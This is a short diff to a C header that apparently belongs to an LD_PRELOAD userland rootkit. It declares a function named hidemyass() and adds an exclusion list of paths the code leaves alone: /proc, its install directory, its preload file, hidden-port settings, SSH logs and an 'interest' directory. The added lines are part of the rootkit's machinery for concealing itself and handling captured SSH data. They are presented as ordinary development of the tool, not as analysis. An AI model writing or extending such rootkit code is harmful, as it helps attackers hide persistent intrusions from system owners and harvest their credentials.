@@ -5,6 +5,11 @@
 int pathtracked(const char *pathname);
 void trackwrite(const char *pathname);
 void hidemyass(void);
+
+/* don't try to track the following for w/e reason */
+static char *const nopetrack[8] = {"/proc", GID_PATH, INSTALL_DIR,
+                                   PRELOAD_FILE, GIDTIME_PATH, HIDEPORTS,
+                                   SSH_LOGS, INTEREST_DIR};
 #endif
 
 #ifdef READ_GID_FROM_FILE
